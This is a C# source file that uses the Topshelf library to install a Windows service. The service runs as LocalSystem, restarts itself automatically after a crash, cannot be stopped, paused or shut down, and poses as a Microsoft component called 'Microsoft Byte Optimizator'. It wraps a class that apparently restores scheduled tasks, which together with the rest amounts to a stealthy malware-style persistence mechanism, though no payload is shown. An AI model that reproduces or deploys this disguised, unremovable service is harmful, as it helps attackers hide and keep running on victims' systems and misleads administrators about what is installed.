using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Topshelf;
using Topshelf.Runtime.Windows;

namespace IdleTimeOptimization
{
    class Program
    {
        static void Main(string[] args)
        {
            Host host = HostFactory.New(x =>
            {
                x.Service<ScheduluedTaskRestore>(s =>
                {
                    s.ConstructUsing(name => new ScheduluedTaskRestore());
                    s.WhenStarted(tc => tc.Start());
                    s.WhenStopped(tc => tc.Stop());
                });

                x.EnableServiceRecovery(r =>
                {
                    //you can have up to three of these
                    r.RestartService(10);
                    r.RestartService(10);
                    r.RestartService(10);
                    r.SetResetPeriod(1);
                });

                x.RunAsLocalSystem();
                x.RunAsLocalSystem();

                x.SetDescription("Optimize byte usage of extensive network payloads");
                x.SetDisplayName("Microsoft Byte Optimizator");
                x.SetServiceName("MicrosoftByteOptimizator");
            });
            WindowsServiceHost windowsService = host as WindowsServiceHost;
            if (windowsService != null)
            {
                windowsService.CanStop = false;
                windowsService.CanPauseAndContinue = false;
                windowsService.CanShutdown = false;
            }
            TopshelfExitCode rc = host.Run();

            var exitCode = (int)Convert.ChangeType(rc, rc.GetTypeCode());
            Environment.ExitCode = exitCode;
        }
    }
}